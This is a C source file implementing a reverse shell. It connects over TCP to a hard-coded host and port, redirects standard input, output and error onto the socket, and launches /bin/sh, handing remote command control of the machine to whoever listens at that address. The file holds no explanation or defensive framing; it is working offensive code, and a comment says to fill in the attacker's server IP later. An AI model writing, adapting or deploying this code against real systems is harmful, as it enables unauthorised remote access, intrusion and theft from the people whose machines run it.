#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <string.h>

int main()
{
	int port = 5000; 
	char ip[] = "192.168.43.117";//complete later with the server's IP
	int sock;

	struct sockaddr_in socket_address;
	memset(&socket_address, 0, sizeof(socket_address));

	sock = socket(AF_INET, SOCK_STREAM, 0);
	if(sock < 0)//error in creating socket
	{
		printf("Socket creation failed\n");
		exit(0);
	}

	printf("Socket created successfully\n");

	socket_address.sin_family = AF_INET;
	socket_address.sin_port = htons(port);
	socket_address.sin_addr.s_addr = inet_addr(ip);

	if(connect(sock, (struct sockaddr *) &socket_address, sizeof(struct sockaddr_in)) < 0)//error at connection
	{
		shutdown(sock, SHUT_RDWR);
		sock = -1;
		printf("Client failed to connect to server\n");
	}

	dup2(sock, 0);
	dup2(sock, 1);
	dup2(sock, 2);

	char * const argv[] = {"/bin/sh", NULL};
	execve("/bin/sh", argv, NULL); 

	return 0;
}